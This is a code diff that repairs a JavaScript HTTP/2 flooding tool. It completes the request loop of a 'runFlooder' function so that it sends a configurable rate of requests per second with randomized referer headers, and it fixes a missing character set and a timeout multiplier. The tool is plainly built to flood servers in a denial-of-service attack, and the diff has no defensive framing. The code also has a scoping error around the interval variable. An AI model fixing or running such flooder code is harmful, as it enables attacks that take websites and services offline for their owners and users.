@@ -93,7 +93,7 @@ class NetSocket {
             readable: true,
         });
 
-        connection.setTimeout(options.timeout * 10000);
+        connection.setTimeout(options.timeout * 1000);
         connection.setKeepAlive(true, 10000);
         connection.setNoDelay(true);
 
@@ -138,6 +138,7 @@ function randomElement(elements) {
 }
 
 function randomCharacters(length) {
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; // Ensure characters is defined
     let output = '';
     for (let count = 0; count < length; count++) {
         output += randomElement(characters);
@@ -227,8 +228,19 @@ function runFlooder() {
         client.on('connect', () => {
             const IntervalAttack = setInterval(() => {
                 for (let i = 0; i < args.Rate; i++) {
-                    headers['referer'] = 'https://'
+                    headers['referer'] = 'https://' + randomElement(['example.com', 'test.com']); // Fix incomplete referer
+                    const req = client.request(headers);
+                    req.end();
+                }
+            }, 1000 / args.Rate);
+        });
 
+        client.on('error', (err) => {
+            console.error('HTTP/2 client error:', err);
+        });
 
-
-         
+        client.on('close', () => {
+            clearInterval(IntervalAttack);
+        });
+    });
+}
